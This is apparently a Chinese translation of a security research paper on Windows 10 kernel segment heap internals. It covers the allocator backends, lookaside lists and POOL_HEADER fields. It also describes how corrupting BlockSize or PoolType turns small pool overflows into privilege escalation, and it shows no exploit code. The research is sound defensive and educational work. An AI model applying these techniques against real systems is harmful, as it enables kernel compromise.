**作者：Muoziiy@天玄安全实验室**  
**原文链接：<https://mp.weixin.qq.com/s/gjMx3-HPEzJPV8PVBUufqA>**

## 前言

在野利用的CVE-2021-31956样本，利用过程中使用了WNF来获取任意地址读写原语，但由于我对WNF不熟悉，所以暂时没有看WNF这块的内容。那么最终我是通过Scoop
the Windows 10
pool这篇文章中的思路实现了CVE-2021-31956的利用，利用过程基本和这篇文章一致，区别可能就是申请漏洞块并实现溢出那里需要自行研究一下。由于众所周知的原因，这里不对CVE-2021-31956进行分析，而是对这篇文章进行翻译并对其中的demo进行了分析和复现。

由于本人对内核这块的研究时间不长，对Windows内部机制的理解也不够深入，且英文水平有限，所以翻译和复现的过程中，难免会出现一些错误和理解不到位的地方，如果你发现了任何问题，请与作者联系。

原文及DEMO地址：<https://github.com/synacktiv/Windows-kernel-SegmentHeap-Aligned-Chunk-Confusion>

## 摘要

堆溢出是应用程序中相当常见的漏洞。利用这些漏洞通常需要对堆的底层管理机制非常了解。Windows10最近改变了内核中堆的管理方式，本文旨在介绍Windows
NT内核堆管理机制的最新发展，同时介绍对内核池的新的利用技术。

## 1 介绍

池是Windows系统为内核层保留的堆空间。多年来，池内存的分配一直非常具体，且与用户层的分配是不同的。自2019年3月，Windows
10更新了19H1以来，这一切都改变了。在用户层众所周知，且已经文档化的段堆被引入内核。

但是，内核层实现的分配器和用户层实现的分配器仍然存在一些不同，因为内核层仍然需要一些特定的材料。本文从利用的角度出发，重点讨论内核段堆自定义内部结构。

文章中介绍的研究内容是针对x64架构的，对于不同的架构需要进行哪些调整尚未研究。

在简单的介绍了池内部结构的历史之后，本文将说明段堆在内核中是如何实现的，以及对内核池特定材料有什么影响。然后，本文将介绍一种利用内核池中堆溢出漏洞对池内部进行攻击的新技术。最后，将介绍一种通用的利用手法，它使用了最小的受控堆溢出，并允许本地特权从低完整性级别升级到SYSTEM。

### 1.1 池内部

本文不会深入讨论池分配器的内部结构，因为这个主题已经被广泛地讨论过了 [5]，但是为了全面理解这篇文章，还是需要快速地回顾一下一些内部结构。

本节将介绍 Windows 7
中的一些池内部结构，以及过去几年中对池进行的各种缓解和更改。这里说明的内部结构将聚焦在适合单个页面的块上，这是内核中最常见的分配。大于0xFE0的分配行为不在今天的讨论范围内。

**在池中分配内存**
Windows内核中，分配和释放池内存的主要函数分别是ExAllocatePoolWithTag和ExFreePoolWithTag。

    
    
    void * ExAllocatePoolWithTag (
        POOL_TYPE PoolType ,
        size_t NumberOfBytes ,
        unsigned int Tag
    );
    void ExFreePoolWithTag (
        void * P, 
        unsigned int Tag
    );

PoolType是一个位域，与下面列举的值关联

    
    
    NonPagedPool = 0
    PagedPool = 1
    NonPagedPoolMustSucceed = 2
    DontUseThisType = 3
    NonPagedPoolCacheAligned = 4
    PagedPoolCacheAligned = 5
    NonPagedPoolCacheAlignedMustSucceed = 6
    MaxPoolType = 7
    PoolQuota = 8
    NonPagedPoolSession = 20h
    PagedPoolSession = 21h
    NonPagedPoolMustSucceedSession = 22h
    DontUseThisTypeSession = 23h
    NonPagedPoolCacheAlignedSession = 24h
    PagedPoolCacheAlignedSession = 25h
    NonPagedPoolCacheAlignedMustSSession = 26h
    NonPagedPoolNx = 200h
    NonPagedPoolNxCacheAligned = 204h
    NonPagedPoolSessionNx = 220h

PoolType中可以存储若干信息：

  * 使用的内存类型，可以是NonPagedPool、PagedPool、SessionPool或NonPagedPoolNx；
  * 如果分配是关键的（bit 1）并且必须成功。那么当分配失败，就会触发BugCheck；
  * 如果分配与缓存大小对齐（bit 2）
  * 如果分配使用了PoolQuota机制(bit 3)
  * 其他未文档化的机制

使用的内存类型很重要，因为它隔离了不同内存范围中的分配。使用的两种主要内存类型是PagedPool和NonPagedPool。MSDN文档将其描述如下：

`非分页池（NonpagedPool）是不可分页的系统内存，它可以从任何IRQL访问，但非分页内存是一种稀缺资源，驱动程序应当在必须使用时才去分配非分页内存。分页池（Paged）是可分页的系统内存，只能在IRQL<DISPATCH_LEVEL时分配和访问。`

如1.2节所述，在Win8中引入了NonPagedPoolNx，必须使用它来替代NonpagedPool。

SessionPool用于会话空间的分配，对每个用户会话都是唯一的，主要在win32k中使用。

最后，Tag是一个1到4个字符的非零字符文本（例如，“Tag1”）。建议内核开发人员按代码路径使用唯一的Tag，以帮助调试器和验证器识别代码路径。

**POOL_HEADER**
在池中，适合单个页面的所有块都以POOL_HEADER结构开头，POOL_HEADER包含分配器所需信息和Tag信息。当试图在Windows内核中利用堆溢出漏洞时，首先要覆盖的就是POOL_HEADER结构。攻击者有两个选择：重写一个正确的POOL_HEADER结构，并用来攻击下一个块的数据，或者直接攻击POOL_HEADER结构。

不管用哪种攻击方法，POOL_HEADER都会被覆盖，同时需要对POOL_HEADER的每个字段及其如何使用非常了解，才能够利用这种漏洞。本文将主要关注直接攻击POOL_HEADER。

    
    
    //Windows 1809 中简化的 POOL_HEADER 结构
    struct POOL_HEADER
    {
        char PreviousSize;
        char PoolIndex;
        char BlockSize;
        char PoolType;
        int PoolTag;
        Ptr64 ProcessBilled ;
    };

POOL_HEADER的结构在过去的一段时间里，略微有些变化，但始终保持着一些主要字段。在Windows 1809，19H1之前，所有的字段都会被用到。

    
    
    PreviousSize：之前的块的大小除以16
    PoolIndex：PoolDescriptor数组中的索引
    BlockSize：当前分配的大小除以16
    PoolType：包含分配类型信息的位域
    ProcessBilled：指向分配内存的进程的KPROCESS的指针，只有PoolType中包含PoolQuota标志时，才设置此字段。

### 1.2自win7开始的攻击和缓解措施

Tarjei Mandt及其论文《Windows
7上的内核池攻击》[5]是针对内核池攻击的参考资料。它展示了整个池的内部结构和众多的攻击，其中一些攻击的目标是POOL_HEADER。

**Quota Process Pointer Overwrite**
分配可以针对给定进程收取配额（这里不知道怎么翻译，只能直译了）。为此，ExAllocatePoolWithQuotaTag将利用POOL_HEADER中的ProcessBilled字段来存储指向负责分配的进程的_KPROCESS的指针。

在本文中，攻击被描述为 Quota Process Pointer Overwrite（配额进程指针覆盖）。

攻击利用堆溢出来覆盖已分配的块的POOL_HEADER中的ProcessBilled指针，当块被释放时，如果块的PoolType包含PoolQuota（0x8）标志，那么ProcessBilled字段存储的指针将被用于解引用一个值。所以控制ProcessBilled指针可以提供一个任意指针解引用原语。这足以从用户态实现权限提升。图1展示了这种攻击。

![image-20210825112753613](https://images.seebug.org/content/images/2021/10/19/1634632880000-1lrvdy.png-w331s)

图1. 利用配额进程指针覆盖进行攻击

自Windows
8开始，随着ExpPoolQuotaCookie的引入，这种攻击已经被缓解。Cookie值在系统启动引导阶段生成，用于保护指针不被攻击者覆盖。例如，它对ProcessBilled字段使用XOR运算。

    
    
    ProcessBilled = KPROCESS_PTR ^ ExpPoolQuotaCookie ^ CHUNK_ADDR

当块被释放时，内核将检查编码的指针是否是一个有效的KPROCESS指针。

    
    
    process_ptr = (struct _KPROCESS *)(chunk_addr ^ ExpPoolQuotaCookie ^ chunk_addr ->process_billed );
    if ( process_ptr )
    {
        if (process_ptr < 0xFFFF800000000000 || (process_ptr ->Header.Type & 0x7F) != 3 )
        KeBugCheckEx ([...])
        [...]
    }

在不知道块的地址和ExpPoolQuotaCookie的情况下，不可能提供一个有效的指针，也就无法实现任意指针解引用。但是，仍然可以通过重写一个正确的POOL_HEADER，且不在PoolType设置PoolQuota标志来实现完整数据攻击。更多关于Quota
Process Pointer Overwrite Attack（配额进程指针覆盖攻击）的信息，已经在Nuit du Hack XV会议上进行了讨论[1]。

**NonPagedPoolNx** 在Windows
8中，引入了一种新的池内存类型NonPagedPoolNx。它的工作原理与NonPagedPool完全相同，只是内存页不在是可执行的，从而缓解了所有利用这种内存来存储shellcode的攻击。

以前使用NonPagedPool完成的分配，现在改用NonPagedPoolNx来实现，但出于与第三方驱动兼容的目的，保留了NonPagedPool类型。即使在今天的Windows
10中，仍然有大量的第三方驱动在使用可执行的NonPagedPool。

随着时间的推移，各种缓解措施的引入使得利用堆溢出攻击POOL_HEADER不再有趣。现如今，写一个正确的POOL_HEADER并攻击下一个块的数据实现起来更加简单。然而，池中段堆（Segment
Heap）的引入改变了POOL_HEADER的使用方式，本文展示了如何在内核池中再次利用堆溢出实现攻击。

## 2 带有段堆（Segment Heap）的池分配器

### 2.1 段堆内部

自Windows 10
19H1开始，段堆被用于内核层，与用户层使用的段堆非常相似。本节旨在介绍段堆的主要功能并关注与用户层使用的不同之处。用户层段堆内部结构的详细说明在[7]中提供。

就像在用户层使用的一样，段堆旨在根据分配大小的不同提供不同的功能。为此，定义了4个所谓的后端。

    
    
    Low Fragmentation Heap(abbr LFH):RtlHpLfhContextAllocate
    Variable Size(abbr VS):RtlHpVsContextAllocateInternal
    Segment Alloc(abbr Seg):RtlHpSegAlloc
    Large Alloc: RtlHpLargeAlloc

请求分配的大小和选择的后端之间的映射如图2所示

![image-20210825161801544](https://images.seebug.org/content/images/2021/10/19/1634632880000-2vmowl.png-w331s)

图2. 分配大小和后端之间的映射

前三个后端，Seg，VS，LFH，分别与上下文相关联：_HEAP_SEG_CONTEXT， _HEAP_VS_CONTEXT
和_HEAP_LFH_CONTEXT。后端上下文存储在_SEGMENT_HEAP结构中。

    
    
    1: kd > dt nt!_SEGMENT_HEAP
    +0 x000 EnvHandle : RTL_HP_ENV_HANDLE
    +0 x010 Signature : Uint4B
    +0 x014 GlobalFlags : Uint4B
    +0 x018 Interceptor : Uint4B
    +0 x01c ProcessHeapListIndex : Uint2B
    +0 x01e AllocatedFromMetadata : Pos 0, 1 Bit
    +0 x020 CommitLimitData : _RTL_HEAP_MEMORY_LIMIT_DATA
    +0 x020 ReservedMustBeZero1 : Uint8B
    +0 x028 UserContext : Ptr64 Void
    +0 x030 ReservedMustBeZero2 : Uint8B
    +0 x038 Spare : Ptr64 Void
    +0 x040 LargeMetadataLock : Uint8B
    +0 x048 LargeAllocMetadata : _RTL_RB_TREE
    +0 x058 LargeReservedPages : Uint8B
    +0 x060 LargeCommittedPages : Uint8B
    +0 x068 StackTraceInitVar : _RTL_RUN_ONCE
    +0 x080 MemStats : _HEAP_RUNTIME_MEMORY_STATS
    +0 x0d8 GlobalLockCount : Uint2B
    +0 x0dc GlobalLockOwner : Uint4B
    +0 x0e0 ContextExtendLock : Uint8B
    +0 x0e8 AllocatedBase : Ptr64 UChar
    +0 x0f0 UncommittedBase : Ptr64 UChar
    +0 x0f8 ReservedLimit : Ptr64 UChar
    +0 x100 SegContexts : [2] _HEAP_SEG_CONTEXT
    +0 x280 VsContext : _HEAP_VS_CONTEXT
    +0 x340 LfhContext : _HEAP_LFH_CONTEXT

存在5个_SEGMENT_HEAP结构，对应不同的_POOL_TYPE值。

    
    
    NonPaged pools（bit 0 unset）
    NonPagedNx pool（bit 0 unset and bit 9 set）
    Paged pools （bit 0 set）
    PagedSession pool （bit 5 and 1 set）

第五个段堆也被分配，但是作者没有找到它的用途。前三个与NonPaged、NonPagedNx、Paged相关的段堆被存储在HEAP_POOL_NODES中。与PagedPoolSession相关联的段堆被存储在当前线程中。图3总结了5个段堆

![image-20210825171133342](https://images.seebug.org/content/images/2021/10/19/1634632881000-3wqpgx.png-w331s)

图3. 段后端内部结构

尽管用户层段堆仅使用一个段分配器上下文进行128KB到508KB之间的分配，但在内核层段堆使用两个段分配器上下文，第二个用于508KB到7GB之间的分配。

#### 段后端（Segment Backend）

段后端被用于分配大小在128KB到7GB之间的内存块。它也在后台使用，为VS和LFH后端分配内存。

段后端上下文存储在称作_HEAP_SEG_CONTEXT的结构体中。

    
    
    1: kd > dt nt! _HEAP_SEG_CONTEXT
    +0 x000 SegmentMask : Uint8B
    +0 x008 UnitShift : UChar
    +0 x009 PagesPerUnitShift : UChar
    +0 x00a FirstDescriptorIndex : UChar
    +0 x00b CachedCommitSoftShift : UChar
    +0 x00c CachedCommitHighShift : UChar
    +0 x00d Flags : <anonymous -tag >
    +0 x010 MaxAllocationSize : Uint4B
    +0 x014 OlpStatsOffset : Int2B
    +0 x016 MemStatsOffset : Int2B
    +0 x018 LfhContext : Ptr64 Void
    +0 x020 VsContext : Ptr64 Void
    +0 x028 EnvHandle : RTL_HP_ENV_HANDLE
    +0 x038 Heap : Ptr64 Void
    +0 x040 SegmentLock : Uint8B
    +0 x048 SegmentListHead : _LIST_ENTRY
    +0 x058 SegmentCount : Uint8B
    +0 x060 FreePageRanges : _RTL_RB_TREE
    +0 x070 FreeSegmentListLock : Uint8B
    +0 x078 FreeSegmentList : [2] _SINGLE_LIST_ENTRY

![image-20210825174544974](https://images.seebug.org/content/images/2021/10/19/1634632881000-4uvyav.png-w331s)

图4. 段后端内部结构图

段后端通过称为段的可变大小块分配内存。每个段由多个可分配的页组成。

段存储在SegmentListHead的链表中。段以一个_HEAP_PAGE_SEGMENT开头，后面跟着256个_HEAP_PAGE_RANGE_DESCRIPTOR结构。

    
    
    1: kd > dt nt! _HEAP_PAGE_SEGMENT
    +0 x000 ListEntry : _LIST_ENTRY
    +0 x010 Signature : Uint8B
    +0 x018 SegmentCommitState : Ptr64 _HEAP_SEGMENT_MGR_COMMIT_STATE
    +0 x020 UnusedWatermark : UChar
    +0 x000 DescArray : [256] _HEAP_PAGE_RANGE_DESCRIPTOR
    
    
    1: kd > dt nt! _HEAP_PAGE_RANGE_DESCRIPTOR
    +0 x000 TreeNode : _RTL_BALANCED_NODE
    +0 x000 TreeSignature : Uint4B
    +0 x004 UnusedBytes : Uint4B
    +0 x008 ExtraPresent : Pos 0, 1 Bit
    +0 x008 Spare0 : Pos 1, 15 Bits
    +0 x018 RangeFlags : UChar
    +0 x019 CommittedPageCount : UChar
    +0 x01a Spare : Uint2B
    +0 x01c Key : _HEAP_DESCRIPTOR_KEY
    +0 x01c Align : [3] UChar
    +0 x01f UnitOffset : UChar
    +0 x01f UnitSize : UChar

为了提供对空闲页面范围的快速查找，还在_HEAP_SEG_CONTEXT中维护了一个红黑树。

每个_HEAP_PAGE_SEGMENT 都有一个签名，计算方法如下

    
    
    Signature = Segment ^ SegContext ^ RtlpHpHeapGlobals ^ 0xA2E64EADA2E64EAD ;

此签名用于从任何已分配的内存块中检索拥有的_HEAP_SEG_CONTEXT和相应的_SEGMENT_HEAP。

图4总结了段后端中使用的内部结构。

通过使用存储在_HEAP_SEG_CONTEXT中的SegmentMask掩码，可以快速从任意地址计算出原始段。SegmentMask的值为0xfffffffffff00000。

    
    
    Segment = Addr & SegContext ->SegmentMask;

通过使用_HEAP_SEG_CONTEXT中的UnitShift，可以轻松从任意地址计算出相应的PageRange。UnitShift设置为12。

    
    
    PageRange = Segment + sizeof( _HEAP_PAGE_RANGE_DESCRIPTOR ) * (Addr- Segment) >> SegContext ->UnitShift;

当Segment
Backend被另一个后端使用时，_HEAP_PAGE_RANGE_DESCRIPTOR的RangeFlags字段被用于存储请求分配的后端。

#### 可变大小后端（Variable Size Backend）

可变大小后端分配512B到128KB大小的块。它旨在提供对空闲块的轻松重用。

可变大小后端上下文存储在被称为_HEAP_VS_CONTEXT的结构体中。

    
    
    0: kd > dt nt! _HEAP_VS_CONTEXT
    +0 x000 Lock : Uint8B
    +0 x008 LockType : _RTLP_HP_LOCK_TYPE
    +0 x010 FreeChunkTree : _RTL_RB_TREE
    +0 x020 SubsegmentList : _LIST_ENTRY
    +0 x030 TotalCommittedUnits : Uint8B
    +0 x038 FreeCommittedUnits : Uint8B
    +0 x040 DelayFreeContext : _HEAP_VS_DELAY_FREE_CONTEXT
    +0 x080 BackendCtx : Ptr64 Void
    +0 x088 Callbacks : _HEAP_SUBALLOCATOR_CALLBACKS
    +0 x0b0 Config : _RTL_HP_VS_CONFIG
    +0 x0b4 Flags : Uint4B

可变大小后端的内部结构

![image-20210826161801410](https://images.seebug.org/content/images/2021/10/19/1634632882000-5gvlst.png-w331s)

图5. 可变大小后端内部结构

空闲块存储在称为FreeChunkTree的红黑树中。当请求分配时，红黑树用于查找任何大小相同的空闲块或大于请求大小的第一个空闲块。

空闲块以一个称作_HEAP_VS_CHUNK_FREE_HEADER的专用结构体为头部。

    
    
    0: kd > dt nt! _HEAP_VS_CHUNK_FREE_HEADER
    +0 x000 Header : _HEAP_VS_CHUNK_HEADER
    +0 x000 OverlapsHeader : Uint8B
    +0 x008 Node : _RTL_BALANCED_NODE

一旦找到一个空闲块，就会调用RtlpHpVsChunkSplit将其分割为大小合适的块。

已经被分配的块都会以一个名为_HEAP_VS_CHUNK_HEADER的结构体开头。

    
    
    0: kd > dt nt! _HEAP_VS_CHUNK_HEADER
    +0 x000 Sizes : _HEAP_VS_CHUNK_HEADER_SIZE
    +0 x008 EncodedSegmentPageOffset : Pos 0, 8 Bits
    +0 x008 UnusedBytes : Pos 8, 1 Bit
    +0 x008 SkipDuringWalk : Pos 9, 1 Bit
    +0 x008 Spare : Pos 10, 22 Bits
    +0 x008 AllocatedChunkBits : Uint4B
    0: kd > dt nt! _HEAP_VS_CHUNK_HEADER_SIZE
    +0 x000 MemoryCost : Pos 0, 16 Bits
    +0 x000 UnsafeSize : Pos 16, 16 Bits
    +0 x004 UnsafePrevSize : Pos 0, 16 Bits
    +0 x004 Allocated : Pos 16, 8 Bits
    +0 x000 KeyUShort : Uint2B
    +0 x000 KeyULong : Uint4B
    +0 x000 HeaderBits : Uint8B

header结构体中的所有字段都与RtlHpHeapGlobals和块的地址进行异或。

    
    
    Chunk ->Sizes = Chunk ->Sizes ^ Chunk ^ RtlpHpHeapGlobals ;

在内部，VS分配器使用段分配器。它通过_HEAP_VS_CONTXT中的_HEAP_SUBALLOCATOR_CALLBACKS字段在RtlpHpVsSubsegmentCreate中使用。子分配器回调函数都与VS上下文和RtlpHpHeapGlobals地址进行异或。

    
    
    callbacks.Allocate = RtlpHpSegVsAllocate ;
    callbacks.Free = RtlpHpSegLfhVsFree ;
    callbacks.Commit = RtlpHpSegLfhVsCommit ;
    callbacks.Decommit = RtlpHpSegLfhVsDecommit ;
    callbacks.ExtendContext = NULL;

如果FreeChunkTree中没有足够大的块，则会在子段列表中分配并插入一个新的子段，其大小范围为64KiB到256KiB。它以_HEAP_VS_SUBSEGMENT结构体为首。所有剩余的块都用作空闲块被插入到FreeChunkTree中。

    
    
    0: kd > dt nt! _HEAP_VS_SUBSEGMENT
    +0 x000 ListEntry : _LIST_ENTRY
    +0 x010 CommitBitmap : Uint8B
    +0 x018 CommitLock : Uint8B
    +0 x020 Size : Uint2B
    +0 x022 Signature : Pos 0, 15 Bits
    +0 x022 FullCommit : Pos 15, 1 Bit

图5总结了VS后端的内存架构。

当VS块被释放时，如果它小于1KB并且VS后端是正确配置的（Config.Flags的第四位配置为1），它将被临时存储在DelayFreeContext列表中。一旦DelayFreeContext填充了32个块，这些块将一次性全部被释放。DelayFreeContext从不用于直接分配。

当一个VS块真的被释放，如果它与其他两个空闲块相邻，那么这三个空闲块将利用函数RtlpHpVsChunkCoalesce合并在一起。然后合并后的大块将被插入到FreeChunkTree中。

#### 低碎片化堆后端（Low Fragmentation Heap Backend）

低碎片化的堆是一个专门用来分配1B到512B的小块的后端。

LFH后端上下文存储在称作_HEAP_LFH_CONTEXT的结构体中。

    
    
    0: kd > dt nt! _HEAP_LFH_CONTEXT
    +0 x000 BackendCtx : Ptr64 Void
    +0 x008 Callbacks : _HEAP_SUBALLOCATOR_CALLBACKS
    +0 x030 AffinityModArray : Ptr64 UChar
    +0 x038 MaxAffinity : UChar
    +0 x039 LockType : UChar
    +0 x03a MemStatsOffset : Int2B
    +0 x03c Config : _RTL_HP_LFH_CONFIG
    +0 x040 BucketStats : _HEAP_LFH_SUBSEGMENT_STATS
    +0 x048 SubsegmentCreationLock : Uint8B
    +0 x080 Buckets : [129] Ptr64 _HEAP_LFH_BUCKET

LFH后端的主要特点是使用不同大小的bucket来避免碎片化

![image-20210826175052572](https://images.seebug.org/content/images/2021/10/19/1634632882000-6uofcj.png-w331s)

图6

每个bucket由段分配器分配的子段组成。段分配器通过使用_HEAP_LFH_CONTEXT结构体的_HEAP_SUBALLOCATOR_CALLBACKS字段来使用。子分配器回调函数与LFH上下文和RtlpHpHeapGlobals的地址进行异或。

    
    
    callbacks.Allocate = RtlpHpSegLfhAllocate ;
    callbacks.Free = RtlpHpSegLfhVsFree ;
    callbacks.Commit = RtlpHpSegLfhVsCommit ;
    callbacks.Decommit = RtlpHpSegLfhVsDecommit ;
    callbacks.ExtendContext = RtlpHpSegLfhExtendContext ;

LFH子段以_HEAP_LFH_SUBSEGMENT结构体为首

    
    
    0: kd > dt nt! _HEAP_LFH_SUBSEGMENT
    +0 x000 ListEntry : _LIST_ENTRY
    +0 x010 Owner : Ptr64 _HEAP_LFH_SUBSEGMENT_OWNER
    +0 x010 DelayFree : _HEAP_LFH_SUBSEGMENT_DELAY_FREE
    +0 x018 CommitLock : Uint8B
    +0 x020 FreeCount : Uint2B
    +0 x022 BlockCount : Uint2B
    +0 x020 InterlockedShort : Int2B
    +0 x020 InterlockedLong : Int4B
    +0 x024 FreeHint : Uint2B
    +0 x026 Location : UChar
    +0 x027 WitheldBlockCount : UChar
    +0 x028 BlockOffsets : _HEAP_LFH_SUBSEGMENT_ENCODED_OFFSETS
    +0 x02c CommitUnitShift : UChar
    +0 x02d CommitUnitCount : UChar
    +0 x02e CommitStateOffset : Uint2B
    +0 x030 BlockBitmap : [1] Uint8B

然后将每个子段分割成相应的bucket大小的不同的LFH块。

为了知道哪个bucket被使用，在每个子段的header中维护了一个bitmap。

![image-20210826192547035](https://images.seebug.org/content/images/2021/10/19/1634632883000-7ovrmb.png-w331s)

图7. 低碎片化堆后端内部结构

当请求一个分配的时候，LFH分配器将首先在_HEAP_LFH_SUBSEGMENT结构中寻找Freelist子段，目的是为了找到子段中最后释放的块的偏移。接着将扫描BlockBitmap，在32个块里找一个空闲块。由于RtlpLowFragHeapRandomData表，导致这个扫描是随机的。

根据给定的bucket的竞争状况，可以启用一种机制使得每个CPU有一个专属子段用于实现简易分配，这种机制称为Affinity Slot（亲和槽）。

图7展示了LFH后端的主要架构。

#### 动态快表（Dynamic Lookaside）

大小为0x200到0xF80字节的释放块可以被临时存储在快表中以提供快速分配。当这些块处于快表中时，这些块不会走后端释放机制。

快表由_RTL_DYNAMIC_LOOKASIDE结构体来表示，并存储在_SEGMENT_HEAP结构体的UserContext域中。

    
    
    0: kd > dt nt! _RTL_DYNAMIC_LOOKASIDE
    +0 x000 EnabledBucketBitmap : Uint8B
    +0 x008 BucketCount : Uint4B
    +0 x00c ActiveBucketCount : Uint4B
    +0 x040 Buckets : [64] _RTL_LOOKASIDE

每个释放的块都存储在与其大小相对应的_RTL_LOOKASIDE中，大小对应着LFH中Bucket一样的模式

    
    
    0: kd > dt nt!_RTL_LOOKASIDE
    +0 x000 ListHead : _SLIST_HEADER
    +0 x010 Depth : Uint2B
    +0 x012 MaximumDepth : Uint2B
    +0 x014 TotalAllocates : Uint4B
    +0 x018 AllocateMisses : Uint4B
    +0 x01c TotalFrees : Uint4B
    +0 x020 FreeMisses : Uint4B
    +0 x024 LastTotalAllocates : Uint4B
    +0 x028 LastAllocateMisses : Uint4B
    +0 x02c LastTotalFrees : Uint4B

![image-20210826205312638](https://images.seebug.org/content/images/2021/10/19/1634632884000-8jhegj.png-w331s)

图8

在同一时间，仅可启用一个可用buckets子集。每次请求分配时，相应的快表指标都会更新。

每扫描三次Balance Set
Mangager，动态快表就会重新平衡。启动了自上次重新平衡以来使用最多的。每个快表的大小取决于它的用途，但最大不能超过MaximumDepth，最小不能小于4。当新分配的数量小于25时，深度将减小10。另外，当未命中率小于0.5时，深度将减小到1，否则将按照下列公式来增长。

### 2.2 POOL_HEADER

如1.1节所述，Windows 10
19H1之前的内核层堆分配器分配的所有块都以POOL_HEADER为头部。在当时，POOL_HEADER中所有的字段都被使用了。随着内核层堆分配器的更新，POOL
HEADER的大部分字段都变的无用了，但仍然有少量分配的内存以POOL_HEADER为首。

    
    
    //POOL_HEADER定义
    struct POOL_HEADER
    {
    char PreviousSize;
    char PoolIndex;
    char BlockSize;
    char PoolType;
    int PoolTag;
    Ptr64 ProcessBilled ;
    };

分配器设置的唯一字段如下

    
    
    PoolHeader ->PoolTag = PoolTag;
    PoolHeader ->BlockSize = BucketBlockSize >> 4;
    PoolHeader ->PreviousSize = 0;
    PoolHeader ->PoolType = changedPoolType & 0x6D | 2;

下面是总结的自windows 19H1以来POOL_HEADER结构体的每个字段用途

    
    
    PreviousSize：未使用的，并保持为0
    PoolIndex：未使用的
    BlockSize：块的大小，仅用于最终将块存储在动态快表中
    PoolType：用法没有改变，依旧是请求的池的类型
    PoolTag：用法没有改变，依旧是池标签
    ProcessBilled：用法没有改变，保持对请求分配内存的进程进行追踪，如果池类型为PoolQuota,那么ProcessBilled的计算方法如下
    
    ProcessBilled = chunk_addr ^ ExpPoolQuotaCookie ^ KPROCESS

#### 缓存对齐

当调用ExAllocatPoolWithTag时，如果PoolType有CacheAligned位被设置，函数执行后返回的内存是与Cache对齐的。Cache线的大小取决于CPU，但通常来说都是0x40。

首先分配器会增加ExpCacheLineSize的大小

    
    
    if ( PoolType & 4 )
    {
    request_alloc_size += ExpCacheLineSize ;
    if ( request_alloc_size > 0xFE0 )
    {
    request_alloc_size -= ExpCacheLineSize ;
    PoolType = PoolType & 0xFB;
    }
    }

如果新的分配大小不能容纳在单个页面中，那么CacheAligned位将会被忽略。

并且，分配的块必须遵守下面的三个条件：

  * 最终分配的地址必须与ExpCacheLineSize对齐
  * 在块的最开始处，必须有一个POOL_HEADER头
  * 块在分配的地址减去POOL_HEADER的大小的地址处必须有一个POOL_HEADER。

因此，如果分配的地址没有正确的对齐，那么块可能会有两个headers。

![image-20210827111442256](https://images.seebug.org/content/images/2021/10/19/1634632884000-9zvjuh.png-w331s)
图9. 缓存对齐的内存布局

像往常一样，第一个POOL_HEADER将在块的起始处，第二个将在ExpCacheLineSize-Sizeof(POOL_HEADER)上对齐，使最终的分配地址与ExpCacheLineSize对齐。CacheAligned将从第一个POOL_HEADER中移除，且第二个POOL_HEADER将使用以下值来填充：

  * PreviousSize：用来保存两个headers之间的偏移
  * PoolIndex：未使用
  * BlockSize：在第一个POOL_HEADER中申请的bucket的大小。
  * PoolType：和之前一样，但是CacheAligned位必须设置
  * PoolTag：像往常一样，两个POOL_HEADER是相同的
  * ProcessBilled：未使用

此外，如果对齐填充中有足够的空间，则我们命名为AlignedPoolHeader的指针可能会存储在第一个POOL_HEADER之后。它指向第二个POOL_HEADER，并与ExpPoolQuotaCookie异或。

图9总结了缓存对齐情况下两个POOL_HEADER的布局。

### 2.3 总结

自Windows
19H1和引入段堆以来，一些存储在每个块的POOL_HEADER中的信息不要需要了。但是，其他的一些，例如PoolType，PoolTag，或是使用CacheAligned和PoolQuota机制的能力依旧需要。

这就是为什么分配的小于0xFE0块至少都还有一个POOL_HEADER头。自Windwos
19H1以来，POOL_HEADER结构体的字段的用法在2.2节中介绍过了。图10表示了使用LFH后端分配的一个块，因此前面只有一个POOL_HEADER头。

![image-20210828102328092](https://images.seebug.org/content/images/2021/10/19/1634632884000-10nkuij.png-w331s)

图10. 返回的LHF块

正如2.1节中解释的那样，不同的后端，申请的内存块可能以不同的header开头。例如，一个使用VS后端分配的大小0x280的块，因此将以大小为0x10的_HEAP_VS_CHUNK_HEADER开头。图11代表了一个使用VS段分配的块，因此是以VS
HEADER和POOL_HEADER开头。

![image-20210828103812541](https://images.seebug.org/content/images/2021/10/19/1634632885000-11gzgtn.png-w331s)

图11. 返回的VS块

最后，如果请求的分配要以Cache
Line对齐，那么块可能包含两个POOL_HEADER头。第二个POOL_HEADER的CacheAligned位将会被设置，并用于检索第一个块和实际分配的地址。图12代表了一个使用LFH申请并需要与Cacha
Size对齐的块，因此开头的是两个POOL_HEADER。

![image-20210828115727449](https://images.seebug.org/content/images/2021/10/19/1634632885000-12lktde.png-w331s)

图12. 返回的以缓存大小对齐的LFH块

图13总结了分配时的决策树

![image-20210828115154603](https://images.seebug.org/content/images/2021/10/19/1634632886000-13jzemp.png-w331s)
图13. 段堆分配器的决策流

从漏洞利用的角度，可以得出两个结论。第一，POOL_HEADER的新用法使利用变得容易：由于大多数字段没有使用，因此覆盖的时候不用非常小心。第二，就是利用POOL_HEADER的新用法来寻找新的利用技术。

## 3 攻击POOL_HEADER

如果堆溢出漏洞允许很好的控制写入的数据和大小，那么最简单的解决方法可能是重写POOL_HEADER并且直接攻击下一个块的数据。唯一要做的事情就是控制PoolType中的PoolQuota位没有被设置，以避免在释放破坏的区块时对ProcessBilled字段进行完整性检查。

但是，本节将提供一些针对POOL_HEADER的攻击，且这些攻击仅仅只需堆溢出几个字节。

### 3.1 BlockSize作为目标

从堆溢出到更大的堆溢出

正如2.1节中解释的，在释放机制中，BlockSize字段被用于存储一些块到动态快表中。

攻击者可以通过堆溢出来改变BlockSize字段的值使其变的更大，大于0x200。如果破坏的块已经被释放，被控制的BlockSize将被用于存储一些错误大小的块在快表中。再次申请这个大小的块时可能会使用一个非常小的分配的内存来存储所需的数据，从而触发另一个堆溢出。

通过使用堆喷技术和一些指定的对象，攻击者可能将一个3个字节的堆溢出实现变成高达0xFD0字节字节的堆溢出，这取决于漏洞块的大小。同样，攻击者还可以选择用来溢出的对象，并且可能对溢出条件有更多的控制。

### 3.2 PoolType作为目标

大多数时候，存储在PoolType中的信息只是用来提供信息；它在分配的时候提供信息，并存储在PoolType中，但不会用于释放机制中。

例如，改变存储在PoolType中的内存类型实际上不会改变分配的内存的类型。不会因为仅仅只改变了PoolType中的一个bit位就会将NonPagedPoolNx类型改为NonPagedPool。

但是对于PoolQuota和CacheAligned位来说不是这样的。设置PoolQuota位将触发POOL_HEADER中ProcessBilled指针的使用，以便在释放时解除对配额的引用。如1.2节中所述，对ProcessBilled指针的攻击已经得到了缓解。

所以唯一剩下的位就是CacheAligned位。

